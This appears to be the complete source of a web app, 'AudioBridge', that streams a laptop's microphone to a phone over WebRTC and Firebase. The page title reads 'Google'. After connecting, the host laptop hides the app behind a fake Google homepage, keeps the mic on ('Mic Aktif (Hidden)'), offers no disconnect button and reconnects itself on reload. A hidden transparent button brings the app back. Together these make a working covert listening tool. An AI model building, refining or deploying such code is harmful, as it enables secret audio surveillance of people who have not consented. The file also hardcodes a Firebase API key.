<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title> 
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* Animasi Gelombang Audio */
        @keyframes pulse-ring {
            0% { transform: scale(0.8); opacity: 0.5; }
            100% { transform: scale(2); opacity: 0; }
        }
        .pulse-animation::before {
            content: '';
            position: absolute;
            left: 0; top: 0; right: 0; bottom: 0;
            border-radius: 50%;
            border: 2px solid currentColor;
            animation: pulse-ring 2s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }
        .hidden { display: none !important; }

        /* Google Overlay Styles */
        .google-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background-color: #ffffff;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
        }
        
        .g-btn {
            background-color: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            font-family: arial,sans-serif;
            font-size: 14px;
            margin: 11px 4px;
            padding: 0 16px;
            line-height: 27px;
            height: 36px;
            min-width: 54px;
            text-align: center;
            cursor: pointer;
            user-select: none;
        }
        .g-btn:hover {
            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
            background-color: #f8f9fa;
            border: 1px solid #dadce0;
            color: #202124;
        }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 font-sans min-h-screen flex flex-col">

    <!-- CONTAINER UTAMA APP -->
    <div id="mainAppContainer" class="flex flex-col min-h-screen transition-opacity duration-500">
        <!-- Header Asli App -->
        <header class="p-4 border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-10 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <i class="fa-solid fa-tower-broadcast text-cyan-400"></i>
                <h1 class="font-bold text-lg tracking-tight">AudioBridge</h1>
            </div>
            <div id="connectionStatus" class="text-xs font-mono bg-slate-800 px-2 py-1 rounded text-slate-400">
                OFFLINE
            </div>
        </header>

        <main class="flex-1 flex flex-col items-center justify-center p-6 w-full max-w-md mx-auto relative">
            
            <!-- HALAMAN 1: LANDING / PILIH MODE -->
            <div id="landingPage" class="w-full space-y-8">
                <div class="text-center space-y-2">
                    <h2 class="text-2xl font-bold text-white">Setup Mode</h2>
                    <p class="text-slate-400 text-sm">Pilih peran perangkat ini</p>
                </div>

                <!-- Tombol Host (Laptop) -->
                <button onclick="startHosting()" class="w-full group relative overflow-hidden rounded-2xl bg-gradient-to-r from-blue-600 to-indigo-700 p-6 text-left hover:scale-[1.02] transition-all shadow-lg shadow-blue-900/20">
                    <div class="flex items-center justify-between relative z-10">
                        <div>
                            <h3 class="text-lg font-bold text-white">Mode Laptop (Host)</h3>
                            <p class="text-blue-100 text-xs mt-1">ID Tetap + Auto Reconnect</p>
                        </div>
                        <i class="fa-solid fa-laptop text-2xl text-white/80"></i>
                    </div>
                </button>

                <div class="relative flex items-center py-2">
                    <div class="flex-grow border-t border-slate-800"></div>
                    <span class="flex-shrink-0 mx-4 text-slate-600 text-xs uppercase">Atau gabung</span>
                    <div class="flex-grow border-t border-slate-800"></div>
                </div>

                <!-- Form Join (HP) -->
                <div class="bg-slate-900 p-5 rounded-2xl border border-slate-800 space-y-4">
                    <div class="flex items-center gap-2 text-slate-300 mb-1">
                        <i class="fa-solid fa-mobile-screen"></i>
                        <span class="font-medium text-sm">Mode HP (Monitor)</span>
                    </div>
                    <input type="text" id="joinInput" placeholder="Masukkan ID Laptop" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-center text-lg font-mono tracking-widest text-white focus:outline-none focus:border-cyan-500 placeholder:text-sm placeholder:font-sans uppercase">
                    <button onclick="joinRoom()" class="w-full bg-slate-800 hover:bg-slate-700 text-white font-medium py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
                        <i class="fa-solid fa-link"></i> Hubungkan
                    </button>
                </div>
            </div>

            <!-- HALAMAN 2: ACTIVE CALL -->
            <div id="activePage" class="hidden w-full space-y-6 text-center">
                
                <!-- Kartu ID & Status -->
                <div id="statusCard" class="relative p-8 rounded-3xl bg-slate-900 border border-slate-800 overflow-hidden">
                    <!-- Ripple Effect Container -->
                    <div id="rippleEffect" class="absolute inset-0 flex items-center justify-center pointer-events-none hidden">
                        <div class="w-32 h-32 rounded-full pulse-animation text-emerald-500/20"></div>
                    </div>

                    <div class="relative z-10">
                        <div class="mb-4">
                            <span id="roleBadge" class="text-[10px] uppercase tracking-wider font-bold bg-slate-800 px-2 py-1 rounded text-slate-400">Host</span>
                        </div>
                        <h2 id="displayRoomId" class="text-4xl font-mono font-bold text-white tracking-wider mb-2 select-all cursor-pointer" onclick="copyId()" title="Klik untuk salin">---</h2>
                        <p id="connectionText" class="text-xs text-emerald-400 font-medium tracking-wide animate-pulse">MENUNGGU KONEKSI...</p>
                    </div>
                </div>

                <div class="flex justify-center gap-3">
                    <button id="copyBtn" onclick="copyId()" class="hidden bg-slate-800 hover:bg-slate-700 text-xs px-4 py-2 rounded-full flex items-center gap-2 text-slate-300 transition-colors">
                        <i class="fa-regular fa-copy"></i> Salin ID
                    </button>
                </div>

                <!-- Kontrol Audio & Info -->
                <div class="grid gap-4 mt-6">
                    <!-- Panel Laptop (Sangat Minimalis) -->
                    <div id="laptopControls" class="hidden text-center">
                        <p class="text-[10px] text-slate-600 font-mono">
                            <i class="fa-solid fa-microphone text-emerald-500 mr-1"></i> Mic Aktif (Hidden)
                        </p>
                        <p class="text-[10px] text-slate-700 mt-1">Camouflage mode standby</p>
                    </div>

                    <!-- Panel HP (Tetap ada tombol) -->
                    <div id="mobileControls" class="hidden">
                        <button onclick="toggleMic()" id="mobileMicBtn" class="w-full py-8 rounded-2xl font-bold text-lg flex items-center justify-center gap-3 bg-slate-800 text-slate-400 border border-slate-700">
                            <i class="fa-solid fa-microphone-slash"></i>
                            <span>MIC MATI</span>
                        </button>
                    </div>

                    <!-- Tombol Stop (Hanya muncul untuk HP/Receiver) -->
                    <button id="disconnectBtn" onclick="stopConnection()" class="hidden mt-4 text-xs text-red-400 hover:text-red-300 flex items-center justify-center gap-2 py-2 w-full">
                        <i class="fa-solid fa-power-off"></i> Putus & Keluar
                    </button>
                </div>

                <!-- Console Log Mini -->
                <div id="logs" class="text-[10px] font-mono text-slate-600 text-left h-20 overflow-y-auto bg-black/20 p-2 rounded border border-slate-800/50">
                    <div>> Ready...</div>
                </div>
            </div>

        </main>
    </div>

    <!-- GOOGLE CAMOUFLAGE OVERLAY -->
    <div id="googleOverlay" class="hidden google-overlay">
        <!-- Google Header -->
        <div class="flex justify-end items-center p-4 gap-4 text-[13px] text-gray-600">
            <a href="#" class="hover:underline">Gmail</a>
            <a href="#" class="hover:underline">Gambar</a>
            <div class="hover:bg-gray-100 p-2 rounded-full cursor-pointer">
                <i class="fa-solid fa-grip text-gray-500 text-lg"></i>
            </div>
            <div class="w-8 h-8 rounded-full bg-purple-600 text-white flex items-center justify-center text-sm font-medium cursor-pointer">
                A
            </div>
        </div>

        <!-- Google Main Body -->
        <div class="flex-1 flex flex-col items-center justify-center -mt-20 px-4">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" width="272" class="mb-8">
            <div class="w-full max-w-[584px] h-[46px] rounded-full border border-gray-200 hover:shadow-md hover:border-gray-300 flex items-center px-4 gap-3 transition-shadow group">
                <i class="fa-solid fa-magnifying-glass text-gray-400"></i>
                <input type="text" class="flex-1 outline-none text-gray-700 text-[16px]" onclick="openYouTubeInNewTab()">
                <img src="https://www.gstatic.com/images/branding/googlemic/2x/googlemic_color_24dp.png" alt="Mic" width="24" class="cursor-pointer">
                <img src="https://www.gstatic.com/images/branding/product/1x/lens_camera_button_100_01_color_24dp.png" alt="Lens" width="24" class="cursor-pointer ml-2">
            </div>
            <div class="mt-8 flex gap-3">
                <button class="g-btn" onclick="openYouTubeInNewTab()">Penelusuran Google</button>
                <button class="g-btn" onclick="openYouTubeInNewTab()">Saya Lagi Beruntung</button>
            </div>
            <div class="mt-6 text-xs text-gray-500">
                Google tersedia dalam bahasa: <a href="#" class="text-blue-700 hover:underline">English</a> <a href="#" class="text-blue-700 hover:underline">Jawa</a> <a href="#" class="text-blue-700 hover:underline">Bali</a>
            </div>
        </div>

        <!-- Google Footer -->
        <div class="bg-[#f2f2f2] text-[#70757a] text-[14px]">
            <div class="px-8 py-3 border-b border-[#dadce0]">
                Indonesia
            </div>
            <div class="px-8 py-3 flex flex-wrap justify-between gap-4">
                <div class="flex gap-6">
                    <a href="#" class="hover:underline">Tentang</a>
                    <a href="#" class="hover:underline">Iklan</a>
                    <a href="#" class="hover:underline">Bisnis</a>
                    <a href="#" class="hover:underline">Cara kerja Penelusuran</a>
                </div>
                <div class="flex gap-6">
                    <a href="#" class="hover:underline">Privasi</a>
                    <a href="#" class="hover:underline">Persyaratan</a>
                    <a href="#" class="hover:underline">Setelan</a>
                </div>
            </div>
        </div>
        
        <button onclick="toggleCamouflage()" class="fixed bottom-0 left-0 w-20 h-20 opacity-0 cursor-default z-50" title="Toggle App UI"></button>
    </div>

    <!-- Audio Element -->
    <audio id="remoteAudio" autoplay playsinline class="hidden"></audio>

    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js';
        import { getAuth, signInAnonymously, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js';
        import { getFirestore, collection, doc, setDoc, getDoc, onSnapshot, updateDoc, addDoc, serverTimestamp, deleteDoc } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js';

        // --- KONFIGURASI FIREBASE ---
        const firebaseConfig = {
            apiKey: "AIzaSyDbhegMTo3-AG4tUPQJkbwlXMbUZmdjVTk",
            authDomain: "p2paudio-fdbde.firebaseapp.com",
            projectId: "p2paudio-fdbde",
            storageBucket: "p2paudio-fdbde.firebasestorage.app",
            messagingSenderId: "734885014321",
            appId: "1:734885014321:web:e6fef64fb7d58802cc9e10",
            measurementId: "G-GTQW9KLKE4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);

        // --- STATE VARIABLES ---
        let user = null;
        let peerConnection = null;
        let localStream = null;
        let mode = null;
        let roomId = null;
        let isMuted = false;

        // UI Refs
        const landingPage = document.getElementById('landingPage');
        const activePage = document.getElementById('activePage');
        const googleOverlay = document.getElementById('googleOverlay');
        const mainAppContainer = document.getElementById('mainAppContainer');
        const connectionText = document.getElementById('connectionText');
        const statusCard = document.getElementById('statusCard');
        const rippleEffect = document.getElementById('rippleEffect');
        const mobileMicBtn = document.getElementById('mobileMicBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');

        const servers = {
            iceServers: [
                { urls: ['stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] }
            ]
        };

        // --- AUTH & AUTO RECONNECT LOGIC ---
        signInAnonymously(auth).catch((error) => console.error(error));

        onAuthStateChanged(auth, (u) => {
            if (u) {
                user = u;
                document.getElementById('connectionStatus').textContent = 'ONLINE';
                document.getElementById('connectionStatus').classList.replace('text-slate-400', 'text-emerald-400');

                checkAutoReconnect();
            }
        });

        function checkAutoReconnect() {
            // Cek status sesi terakhir dari localStorage
            const sessionMode = localStorage.getItem('audiobridge_session_mode'); // 'host' atau 'join'
            const savedJoinId = localStorage.getItem('audiobridge_join_id');

            if (sessionMode === 'host') {
                console.log("Auto-reconnecting Host...");
                startHosting();
            } else if (sessionMode === 'join' && savedJoinId) {
                console.log("Auto-reconnecting Mobile to: " + savedJoinId);
                // Isi input dan jalankan join
                document.getElementById('joinInput').value = savedJoinId;
                joinRoom();
            }
        }

        // --- GOOGLE CAMOUFLAGE LOGIC ---
        window.openYouTubeInNewTab = () => {
            window.open('https://www.youtube.com', '_blank');
        };

        window.activateGoogleMode = () => {
            googleOverlay.classList.remove('hidden');
            mainAppContainer.style.opacity = '0';
            mainAppContainer.style.pointerEvents = 'none';
            mainAppContainer.style.position = 'fixed';
            try {
                const newWindow = window.open('https://www.youtube.com', '_blank');
            } catch (e) {
                console.log("Auto-open failed", e);
            }
        };

        window.toggleCamouflage = () => {
            if (googleOverlay.classList.contains('hidden')) {
                activateGoogleMode();
            } else {
                googleOverlay.classList.add('hidden');
                mainAppContainer.style.opacity = '1';
                mainAppContainer.style.pointerEvents = 'auto';
                mainAppContainer.style.position = 'static';
            }
        };

        // --- WEBRTC SETUP ---
        async function setupLocalAudio(muted = false) {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: { echoCancellation: true, noiseSuppression: true }, 
                    video: false 
                });
                localStream.getAudioTracks()[0].enabled = !muted;
                isMuted = muted;
                if (mode === 'receiver') updateMicUI();
            } catch (err) {
                alert("Gagal akses mikrofon (Wajib untuk WebRTC): " + err.message);
            }
        }

        function createPeerConnection() {
            peerConnection = new RTCPeerConnection(servers);
            if (localStream) {
                localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
            }

            peerConnection.ontrack = (event) => {
                document.getElementById('remoteAudio').srcObject = event.streams[0];
            };

            peerConnection.onconnectionstatechange = () => {
                const state = peerConnection.connectionState;
                log(`Connection: ${state}`);
                
                if (state === 'connected') {
                    connectionText.textContent = "âœ“ TERHUBUNG";
                    connectionText.classList.replace('text-emerald-400', 'text-emerald-300');
                    connectionText.classList.remove('animate-pulse');
                    rippleEffect.classList.remove('hidden');
                    
                    if (mode === 'sender') {
                        setTimeout(() => {
                            activateGoogleMode();
                        }, 1500);
                    }

                } else if (state === 'disconnected' || state === 'failed') {
                    connectionText.textContent = "TERPUTUS - RECONNECTING...";
                    connectionText.classList.add('text-red-500');
                    rippleEffect.classList.add('hidden');
                    // WebRTC native reconnect kadang lama, refresh halaman lebih efektif untuk logic kita
                    setTimeout(() => window.location.reload(), 2000); 
                }
            };
        }

        // --- LOGGING ---
        function log(msg) {
            const d = document.getElementById('logs');
            const p = document.createElement('div');
            p.textContent = `> ${msg}`;
            d.appendChild(p);
        }

        window.copyId = () => {
            navigator.clipboard.writeText(roomId);
            const btn = document.getElementById('copyBtn');
            btn.innerHTML = '<i class="fa-solid fa-check"></i> Disalin';
            setTimeout(() => btn.innerHTML = '<i class="fa-regular fa-copy"></i> Salin ID', 2000);
        };

        // --- HOST STORAGE LOGIC ---
        function getStoredHostId() {
            return localStorage.getItem('audiobridge_host_id');
        }

        function saveHostId(id) {
            localStorage.setItem('audiobridge_host_id', id);
        }

        // --- UNIVERSAL STOP FUNCTION ---
        window.stopConnection = () => {
            // Hapus session flags
            localStorage.removeItem('audiobridge_session_mode');
            localStorage.removeItem('audiobridge_join_id');
            
            // Matikan media
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }
            if (peerConnection) {
                peerConnection.close();
            }
            window.location.reload();
        };

        // --- MAIN FUNCTIONS ---
        window.startHosting = async () => {
            if (!user) return;
            if (mode === 'sender') return; 

            mode = 'sender';
            
            // Simpan status session: HOST
            localStorage.setItem('audiobridge_session_mode', 'host');

            // Handle ID
            const storedId = getStoredHostId();
            if (storedId) {
                roomId = storedId;
                log("ID Tetap: " + roomId);
            } else {
                roomId = Math.random().toString(36).substring(2, 8).toUpperCase();
                saveHostId(roomId);
                log("ID Baru: " + roomId);
            }

            landingPage.classList.add('hidden');
            activePage.classList.remove('hidden');
            document.getElementById('displayRoomId').textContent = roomId;
            document.getElementById('laptopControls').classList.remove('hidden');
            document.getElementById('copyBtn').classList.remove('hidden');
            
            // PASTIKAN TOMBOL DISCONNECT DISEMBUNYIKAN DI MODE HOST
            disconnectBtn.classList.add('hidden');

            await setupLocalAudio(false); 
            createPeerConnection();

            // Firestore Logic
            const callDoc = doc(db, `calls/${roomId}`);
            const offerCandidates = collection(db, `calls/${roomId}/callerCandidates`);
            const answerCandidates = collection(db, `calls/${roomId}/calleeCandidates`);

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) addDoc(offerCandidates, event.candidate.toJSON());
            };

            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);

            await setDoc(callDoc, { 
                offer: { type: offer.type, sdp: offer.sdp },
                createdAt: serverTimestamp() 
            });

            onSnapshot(callDoc, (snapshot) => {
                const data = snapshot.data();
                if (!peerConnection.currentRemoteDescription && data?.answer) {
                    const answer = new RTCSessionDescription(data.answer);
                    peerConnection.setRemoteDescription(answer);
                }
            });

            onSnapshot(answerCandidates, (snapshot) => {
                snapshot.docChanges().forEach((change) => {
                    if (change.type === 'added') {
                        const candidate = new RTCIceCandidate(change.doc.data());
                        peerConnection.addIceCandidate(candidate);
                    }
                });
            });
        };

        window.joinRoom = async () => {
            const inputId = document.getElementById('joinInput').value.toUpperCase();
            if (!user || !inputId) return;
            if (mode === 'receiver') return;

            mode = 'receiver';
            roomId = inputId;

            // Simpan status session: JOINER dan ID nya
            localStorage.setItem('audiobridge_session_mode', 'join');
            localStorage.setItem('audiobridge_join_id', roomId);

            landingPage.classList.add('hidden');
            activePage.classList.remove('hidden');
            document.getElementById('displayRoomId').textContent = roomId;
            document.getElementById('roleBadge').textContent = "HP (Monitor)";
            document.getElementById('mobileControls').classList.remove('hidden');

            // TAMPILKAN TOMBOL DISCONNECT DI MODE HP
            disconnectBtn.classList.remove('hidden');

            const callDoc = doc(db, `calls/${roomId}`);
            const snapshot = await getDoc(callDoc);

            if (!snapshot.exists()) {
                alert("ID Tidak Ditemukan.");
                // Jika ID tidak valid, batalkan auto-reconnect agar tidak loop error
                localStorage.removeItem('audiobridge_session_mode');
                localStorage.removeItem('audiobridge_join_id');
                window.location.reload();
                return;
            }

            await setupLocalAudio(true); 
            createPeerConnection();

            const offerCandidates = collection(db, `calls/${roomId}/callerCandidates`);
            const answerCandidates = collection(db, `calls/${roomId}/calleeCandidates`);

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) addDoc(answerCandidates, event.candidate.toJSON());
            };

            const offerData = snapshot.data().offer;
            await peerConnection.setRemoteDescription(new RTCSessionDescription(offerData));

            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);

            await updateDoc(callDoc, { answer: { type: answer.type, sdp: answer.sdp } });

            onSnapshot(offerCandidates, (snapshot) => {
                snapshot.docChanges().forEach((change) => {
                    if (change.type === 'added') {
                        const candidate = new RTCIceCandidate(change.doc.data());
                        peerConnection.addIceCandidate(candidate);
                    }
                });
            });
        };

        window.toggleMic = () => {
            if (mode !== 'receiver' || !localStream) return;
            const track = localStream.getAudioTracks()[0];
            track.enabled = !track.enabled;
            isMuted = !track.enabled;
            updateMicUI();
        };

        function updateMicUI() {
            if (isMuted) {
                mobileMicBtn.className = "w-full py-8 rounded-2xl font-bold text-lg flex items-center justify-center gap-3 bg-slate-800 text-slate-400 border border-slate-700";
                mobileMicBtn.innerHTML = '<i class="fa-solid fa-microphone-slash"></i><span>MIC MATI</span>';
            } else {
                mobileMicBtn.className = "w-full py-8 rounded-2xl font-bold text-lg flex items-center justify-center gap-3 bg-emerald-600 text-white shadow-lg shadow-emerald-500/20";
                mobileMicBtn.innerHTML = '<i class="fa-solid fa-microphone animate-bounce"></i><span>BICARA...</span>';
            }
        }
    </script>
</body>
</html>
